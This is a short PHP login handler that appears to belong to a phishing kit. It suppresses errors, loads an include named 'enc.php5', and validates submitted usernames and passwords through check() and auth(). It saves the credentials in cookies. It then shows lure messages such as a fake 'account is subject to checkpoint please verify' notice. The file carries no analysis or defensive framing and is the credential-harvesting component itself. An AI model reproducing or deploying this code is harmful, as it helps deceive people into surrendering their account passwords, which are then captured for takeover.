<?php 
error_reporting(0);
require __DIR__ . '/enc.php5';
switch (true) {
	case !empty(username) || !empty(password):
switch (true) {
	case (!getuser() || !getpass()): 
	$login = check(username, password);
		if($login['error'] == 1) {
			setcok('user', username); setcok('pass', password);
			auth(username, password, profile(username));
			require __DIR__ . '/vendor/func/form.php';
		} else if($login['error'] == 2) {
			setcok('user', username); setcok('pass', password);
			auth(username, password, profile(username));
			notify(__DIR__.'/vendor/func/notify.php', 'Sorry, your account is subject to checkpoint please verify first!');
		} else if($login['error'] == 3) {
			notify(__DIR__.'/vendor/func/notify.php', 'Wrong password!');
		} else if($login['error'] == 4) {
			notify(__DIR__.'/vendor/func/notify.php', 'Your account is not found!');
		} break; default: require __DIR__ . '/vendor/func/form.php';
	} break; default: notify(__DIR__.'/vendor/func/notify.php', 'Error!');
} 